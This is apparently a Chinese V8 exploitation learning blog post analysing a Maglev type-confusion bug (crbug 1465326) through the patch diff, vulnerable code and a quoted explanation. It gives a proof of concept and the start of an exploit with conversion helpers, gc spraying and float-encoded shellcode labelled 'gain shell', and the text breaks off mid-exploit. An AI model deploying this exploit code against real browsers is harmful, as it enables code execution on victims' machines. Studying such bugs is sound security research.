<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/maglev/maglev-graph-builder.cc b/src/maglev/maglev-graph-builder.cc</span><br><span class="line">index d5f6128..2c5227e 100644</span><br><span class="line">--- a/src/maglev/maglev-graph-builder.cc</span><br><span class="line">+++ b/src/maglev/maglev-graph-builder.cc</span><br><span class="line">@@ -5347,6 +5347,14 @@</span><br><span class="line">   StoreRegister(iterator_.GetRegisterOperand(0), map_proto);</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line">+bool MaglevGraphBuilder::HasValidInitialMap(</span><br><span class="line">+    compiler::JSFunctionRef new_target, compiler::JSFunctionRef constructor) &#123;</span><br><span class="line">+  if (!new_target.map(broker()).has_prototype_slot()) return false;</span><br><span class="line">+  if (!new_target.has_initial_map(broker())) return false;</span><br><span class="line">+  compiler::MapRef initial_map = new_target.initial_map(broker());</span><br><span class="line">+  return initial_map.GetConstructor(broker()).equals(constructor);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> void MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct() &#123;</span><br><span class="line">   ValueNode* this_function = LoadRegisterTagged(0);</span><br><span class="line">   ValueNode* new_target = LoadRegisterTagged(1);</span><br><span class="line">@@ -5380,7 +5388,9 @@</span><br><span class="line">               TryGetConstant(new_target);</span><br><span class="line">           if (kind == FunctionKind::kDefaultBaseConstructor) &#123;</span><br><span class="line">             ValueNode* object;</span><br><span class="line">-            if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction()) &#123;</span><br><span class="line">+            if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction() &amp;&amp;</span><br><span class="line">+                HasValidInitialMap(new_target_function-&gt;AsJSFunction(),</span><br><span class="line">+                                   current_function)) &#123;</span><br><span class="line">               object = BuildAllocateFastObject(</span><br><span class="line">                   FastObject(new_target_function-&gt;AsJSFunction(), zone(),</span><br><span class="line">                              broker()),</span><br><span class="line">diff --git a/src/maglev/maglev-graph-builder.h b/src/maglev/maglev-graph-builder.h</span><br><span class="line">index 0abb4a8..d92354c 100644</span><br><span class="line">--- a/src/maglev/maglev-graph-builder.h</span><br><span class="line">+++ b/src/maglev/maglev-graph-builder.h</span><br><span class="line">@@ -1884,6 +1884,9 @@</span><br><span class="line">   void MergeDeadLoopIntoFrameState(int target);</span><br><span class="line">   void MergeIntoInlinedReturnFrameState(BasicBlock* block);</span><br><span class="line">  </span><br><span class="line">+  bool HasValidInitialMap(compiler::JSFunctionRef new_target,</span><br><span class="line">+                          compiler::JSFunctionRef constructor);</span><br><span class="line">+</span><br><span class="line">   enum JumpType &#123; kJumpIfTrue, kJumpIfFalse &#125;;</span><br><span class="line">   enum class BranchSpecializationMode &#123; kDefault, kAlwaysBoolean &#125;;</span><br><span class="line">   JumpType NegateJumpType(JumpType jump_type);</span><br><span class="line">diff --git a/test/mjsunit/maglev/regress/regress-crbug-1465326.js b/test/mjsunit/maglev/regress/regress-crbug-1465326.js</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..6e01c1e</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/test/mjsunit/maglev/regress/regress-crbug-1465326.js</span><br><span class="line">@@ -0,0 +1,25 @@</span><br><span class="line">+// Copyright 2023 the V8 project authors. All rights reserved.</span><br><span class="line">+// Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">+// found in the LICENSE file.</span><br><span class="line">+</span><br><span class="line">+// Flags: --maglev --allow-natives-syntax</span><br><span class="line">+</span><br><span class="line">+class A &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+var x = Function;</span><br><span class="line">+</span><br><span class="line">+class B extends A &#123;</span><br><span class="line">+  constructor() &#123;</span><br><span class="line">+    x = new.target;</span><br><span class="line">+    super();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+function construct() &#123;</span><br><span class="line">+  return Reflect.construct(B, [], Function);</span><br><span class="line">+&#125;</span><br><span class="line">+%PrepareFunctionForOptimization(B);</span><br><span class="line">+construct();</span><br><span class="line">+construct();</span><br><span class="line">+%OptimizeMaglevOnNextCall(B);</span><br><span class="line">+var arr = construct();</span><br><span class="line">+console.log(arr.prototype);</span><br></pre></td></tr></table></figure>

<p>从这个MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct()函数名不难看出，这个流程发生在Maglev的图建立阶段，用于处理派生类非默认构造函数的访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">if (compiler::OptionalHeapObjectRef constant =</span><br><span class="line">          TryGetConstant(this_function)) &#123;</span><br><span class="line">    compiler::MapRef function_map = constant-&gt;map(broker());</span><br><span class="line">    compiler::HeapObjectRef current = function_map.prototype(broker());</span><br><span class="line"></span><br><span class="line">    while (true) &#123;</span><br><span class="line">      if (!current.IsJSFunction()) break;</span><br><span class="line">      compiler::JSFunctionRef current_function = current.AsJSFunction();</span><br><span class="line">      if (current_function.shared(broker())</span><br><span class="line">              .requires_instance_members_initializer()) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      if (current_function.context(broker())</span><br><span class="line">              .scope_info(broker())</span><br><span class="line">              .ClassScopeHasPrivateBrand()) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      FunctionKind kind = current_function.shared(broker()).kind();</span><br><span class="line">      if (kind == FunctionKind::kDefaultDerivedConstructor) &#123;</span><br><span class="line">        if (!broker()-&gt;dependencies()-&gt;DependOnArrayIteratorProtector()) break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        broker()-&gt;dependencies()-&gt;DependOnStablePrototypeChain(</span><br><span class="line">            function_map, WhereToStart::kStartAtReceiver, current_function);</span><br><span class="line"></span><br><span class="line">        compiler::OptionalHeapObjectRef new_target_function =</span><br><span class="line">            TryGetConstant(new_target);</span><br><span class="line">        if (kind == FunctionKind::kDefaultBaseConstructor) &#123;</span><br><span class="line">          ValueNode* object;</span><br><span class="line">          if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction()) &#123;</span><br><span class="line">            object = BuildAllocateFastObject(</span><br><span class="line">                FastObject(new_target_function-&gt;AsJSFunction(), zone(),</span><br><span class="line">                           broker()),</span><br><span class="line">                AllocationType::kYoung);</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            object = BuildCallBuiltin&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">                &#123;GetConstant(current_function), new_target&#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          StoreRegister(register_pair.first, GetBooleanConstant(true));</span><br><span class="line">          StoreRegister(register_pair.second, object);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Keep walking up the class tree.</span><br><span class="line">      current = current_function.map(broker()).prototype(broker());</span><br><span class="line">    &#125;</span><br><span class="line">    StoreRegister(register_pair.first, GetBooleanConstant(false));</span><br><span class="line">    StoreRegister(register_pair.second, GetConstant(current));</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>分析字太多我就懒得打了，而且已经有珠玉在前了 下面给出flyyyy师傅博客上对这段代码的解释，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">首先这里会去判断当前前遍历到的 prototype 对象是不是 JSFunction，接着获取这个function的ref，然后如果当前构造函数有实例字段（或类似需要初始化的成员），就不能跳过这个requires_instance_members_initializer构造函数，必须执行它的初始化逻辑，最后判断当前 class是否 有 private 字段或方法，不存在则会强制执行初始化逻辑</span><br><span class="line"></span><br><span class="line">然后通过SFI(SharedFunctionInfo)去获取当前函数的类型，这里补充一下一些函数类型，下面就先解释下会用到的，全部的位于这里src/objects/function-kind.h文件里的FunctionKind枚举类里</span><br><span class="line"></span><br><span class="line">- kDefaultBaseConstructor</span><br><span class="line">  - 默认的基类构造函数（class A &#123;&#125;，没有自定义 constructor）</span><br><span class="line">- kDefaultDerivedConstructor</span><br><span class="line">  - 默认的派生类构造函数（class B extends A &#123;&#125;，没有自定义 constructor）</span><br><span class="line"></span><br><span class="line">当获取到当前函数的类型之后，因为从Derived，所以这个判断kind == FunctionKind::kDefaultDerivedConstructor为true，先执行一个依赖保护，通常都是true。</span><br><span class="line"></span><br><span class="line">但是这里我们修改了Derived的构造函数内容，所以这里会返回false，所以会进入else逻辑，但是因为也不是FunctionKind::kDefaultBaseConstructor类型，所以会接着会遍历到上层，会获取到Base的prototype，判断是否为JSFunction时会转化为基类的构造函数，类型对应的是kDefaultBaseConstructor。然后也是执行依赖保护，从function map开始到current_function，也就是Derived开始到base。使用TryGetConstant获取当前构造函数的ref。接着通过if的判断，判断new_target_func函数是否存在且类型是JSFunction，然后调用FastObject分配快速对象，接着调用BuildAllocateFastObject分配对象，类型是kYoung，可以被gc回收</span><br><span class="line"></span><br><span class="line">如果说这里原型链没有遍历到基类，那么这里的类型就不会是kDefaultBaseConstructor，从而进入else的逻辑，这里会调用BuildCallBuiltin分配对象</span><br><span class="line"></span><br><span class="line">当所有的遍历流程接触，会将结果load到寄存器，最后返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/1.png" alt="1"></p>
<p>上面的是我让AI根据代码画的一个流程图，也可以看一下这个加速理解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FastObject::FastObject(compiler::JSFunctionRef constructor, Zone* zone,</span><br><span class="line">                       compiler::JSHeapBroker* broker)</span><br><span class="line">    : map(constructor.initial_map(broker)) &#123;</span><br><span class="line">  compiler::SlackTrackingPrediction prediction =</span><br><span class="line">      broker-&gt;dependencies()-&gt;DependOnInitialMapInstanceSizePrediction(</span><br><span class="line">          constructor);</span><br><span class="line">  inobject_properties = prediction.inobject_property_count();</span><br><span class="line">  instance_size = prediction.instance_size();</span><br><span class="line">  fields = zone-&gt;NewArray&lt;FastField&gt;(inobject_properties);</span><br><span class="line">  ClearFields();</span><br><span class="line">  elements = FastFixedArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以看到这里没有check根据constructor.initial_map来初始化对象的map，也就是base的initial_map，然后根据当前Base的构造函数预测该构造函数实例化对象的最终属性数量和大小，最后就是为这个对象分配内存</p>
<p>可以看出当快速通道走这条路径时并没有检测target与new_target的map的类型是否一致的情况，如果target是JSObject类型new_target是JSArray类型那么就可以造成类型混淆</p>
<p>下面给出根据走上述有漏洞路径的poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">  var r = Reflect.construct(Derived, [], x);</span><br><span class="line">  return r;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">%PrepareFunctionForOptimization(Derived);</span><br><span class="line">construct();</span><br><span class="line">construct();</span><br><span class="line">%OptimizeMaglevOnNextCall(Derived);</span><br><span class="line"> </span><br><span class="line">var arr = construct();</span><br><span class="line">// console.log(arr.length);</span><br><span class="line">%DebugPrint(arr);</span><br></pre></td></tr></table></figure>

<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208203420035.png" alt="image-20251208203420035"></p>
<p>可以看出这里输出了lenth字段，但是由于是通过类型混淆后lenth并没被初始化所以这里是0</p>
<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/971428_VMV4QRAKRMGNV3T.png" alt="img"></p>
<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/971428_9YEA5TJU9N9S5QS.png" alt="img"></p>
<p>不过可以利用gc回收机制，让分配的对象覆盖到原来可能残留的数据上，又因为lenth并没被初始化，所以lenth区域的残留数据(如果有)是并不会被覆盖的，那么如果lenth刚好是一个很大的值，那么就可以有一个oob了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// gain shell</span><br><span class="line">const shellcode = () =&gt; &#123;return [</span><br><span class="line">    1.9553825422107533e-246,</span><br><span class="line">    1.9560612558242147e-246,</span><br><span class="line">    1.9995714719542577e-246,</span><br><span class="line">    1.9533767332674093e-246,</span><br><span class="line">    2.6348604765229606e-284</span><br><span class="line">];&#125;</span><br><span class="line"> </span><br><span class="line">for(let i = 0; i&lt; 40000; i++)&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">    var res = Reflect.construct(Derived, [], x);</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for (let i = 0; i &lt; 2000; i++) construct();</span><br><span class="line"> </span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">//gc();</span><br><span class="line">//gc();</span><br><span class="line">//gc();</span><br><span class="line">let oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">p(oob_array);</span><br><span 